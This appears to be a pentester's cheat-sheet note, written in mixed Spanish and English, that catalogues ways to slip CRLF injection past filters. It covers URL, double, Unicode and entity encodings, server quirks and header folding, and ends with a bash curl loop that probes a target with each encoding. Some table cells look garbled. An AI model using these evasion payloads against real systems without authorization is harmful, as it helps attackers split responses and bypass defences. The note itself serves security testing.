---
aliases:
  - CRLF Bypass
  - CRLF Encoding
  - Filter Evasion CRLF
tags:
  - type/technique
  - vuln/crlf-injection
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[CRLF Injection]]'
---
# CRLF Injection - Bypass de Sanitización

***

## URL Encoding Variants

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Single URL encoding | `%0d%0a` | Standard. |
| LF only | `%0a` | Some servers tolerate sin CR. |
| CR only | `%0d` | Less common. |
| Mixed case hex | `%0D%0A` | Case bypass de regex. |
| Long form Unicode | `%u000d%u000a` | Microsoft IIS-style. |
| Short Unicode | `%u0a` | Edge. |
| Encoded other reps | `\r\n` literal en JS contexts | Edge. |
| HTML entity | `&#13;&#10;` | If reflected en HTML. |
| Decimal HTML entity | `&#013;&#010;` | Padded. |
| Hex HTML entity | `&#x0d;&#x0a;` | Hex variant. |
| HTML5 encoding | `&NewLine;` | HTML5 named entity. |
| JSON escape | `\\r\\n` (double escape) | If parsed as JSON first. |
| Backslash escape | `\\r\\n` | Edge JS. |
| Form-encoded | `+0d+0a` (uncommon) | Edge. |
| CSV-style escape | `\r\n` literal | Edge. |
| URL fragment | `#%0d%0a` (fragment NOT sent) | Edge — never works server-side. |
^crlfi-bypass-url

___

## Double Encoding

| **Variant** | **Payload** | **Workflow** |
|:---:|:---:|:---:|
| Doble URL encoding | `%250d%250a` | Decoded once → `%0d%0a` → decoded again → `\r\n`. |
| Mixed encoding | `%25%30%64%25%30%61` | Each char encoded twice. |
| Triple encoding | `%25250d%25250a` | Multi-decode chains. |
| URL-encoded slash | `%252F` (= `/`) similar concept | Edge. |
| Combine con HTML entity | `%26%2313%3B%26%2310%3B` (= `&#13;&#10;`) | Multi-format. |
| Backend decodes multiple times | If proxy + app each decode → atacante exploits | Standard chain. |
| WAF only checks first decode | Bypass via multi-decode | Filter bypass. |
| Browser → backend differential | Browser sends encoded, backend decodes | Standard. |
| `+` instead of space | `+%0d%0aHeader` | URL form-encoded variant. |
| Encoded chars to bypass list | URL-encoded `:` `;` etc | Multi-char encode. |
^crlfi-bypass-double

___

## Unicode / Charset Variants

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `
` JS Unicode | `
` (LF) | If JS context. |
| `
` JS | `
` (CR) | Same. |
| `\x0a` Hex literal | If interpreted | Edge. |
| `\012` Octal | Octal LF | Edge. |
| Vertical Tab | `%0b` (VT) | Some servers treat as line break. |
| Form Feed | `%0c` (FF) | Same. |
| NEL (Next Line, Unicode) | `%c2%85` (UTF-8) | Edge. |
| Line Separator | ` ` U+2028 | JS only. |
| Paragraph Separator | ` ` U+2029 | Same. |
| UTF-7 | `+AAAd-+AAAa-` | Old browsers. |
| UTF-16 BE/LE BOM | Byte order mark | Edge. |
| Overlong UTF-8 | `%c0%8d%c0%8a` | Legacy parsers. |
| Best-fit Unicode | `%c0%0a` (Microsoft best-fit) | Microsoft-specific. |
| Punycode | `xn--...` | Edge. |
| Mixed encoding | URL + Unicode + entity combined | Multi-layer. |
^crlfi-bypass-unicode

___

## Server-Specific Quirks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Apache | Strict on CRLF en headers post-2009 | Mostly mitigated. |
| nginx | Strict | Same. |
| IIS / .NET | Older versions vulnerable to splitting | Patched modern. |
| Tomcat | Some parsers laxer | Per-version. |
| Jetty | Per-version | Edge. |
| Node.js (raw http) | No splitting native | Stricter. |
| PHP (raw header()) | Older versions vulnerable | Modern PHP rejects. |
| Java Servlet | Per-container | Per-version. |
| Express (Node.js) | Built-in protection (header validation) | Modern. |
| Flask (Python) | Werkzeug rejects newlines | Modern. |
| Custom RFC parsing | Edge framework laxer | Per-app. |
| HAProxy | Strict reverse proxy | Mostly secure. |
| Cloudflare | Strict at edge | Mostly. |
| AWS ALB | Per-config | Mostly secure. |
| Older PHP `header()` | Pre-5.4 vulnerable | Edge legacy. |
| Custom CGI | Per-implementation | Per-stack. |
^crlfi-bypass-server

___

## Header Folding (Obsolete pero Edge)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | RFC 822 originally allowed multi-line headers via leading whitespace continuation. RFC 7230 obsoleted. | Legacy. |
| Folded continuation | `X-Header: value\r\n continued` | Some old parsers accept. |
| Tab continuation | `\r\n\tcontinued` | Tab variant. |
| Combine con strict reject | If app rejects `\r\n` but accepts folded format | Bypass. |
| Multiple folded lines | `\r\n a\r\n b\r\n c` | Multi-line. |
| Edge case modern | Most servers reject now | Defense. |
| Tests against legacy | If targeting old apps / CGI | Per-target. |
| Combine con HTTP/2 | H2 has different rules | Per-protocol. |
| WebSphere / older Tomcat | More tolerant | Per-stack. |
| Manual verification | curl --data-binary $'\r\n value' | Test. |
^crlfi-bypass-folding

### Encoding bypass matrix

```bash
# Iterate over encoding variants
TARGET="https://target/redirect"
PARAM="url"
PROBE="X-CRLF-Probe:%20FOUND"

ENCODINGS=(
  '%0d%0a'         # Standard
  '%0a'            # LF only
  '%0d'            # CR only
  '%250d%250a'     # Doble URL encoding
  '%E5%98%8A%E5%98%8D'  # UTF-8 best-fit
  '%u000d%u000a'   # IIS Unicode
  '\r\n'           # Literal (some langs interpret)
  '%0d%0aFoo:%20bar%0d%0a'  # Multiple
)

for enc in "${ENCODINGS[@]}"; do
  echo "=== $enc ==="
  PAYLOAD="test${enc}${PROBE}"
  curl -sI "$TARGET?$PARAM=$PAYLOAD" | grep -i 'X-CRLF-Probe:' && \
    echo "[+] Bypass works: $enc"
done
```

***
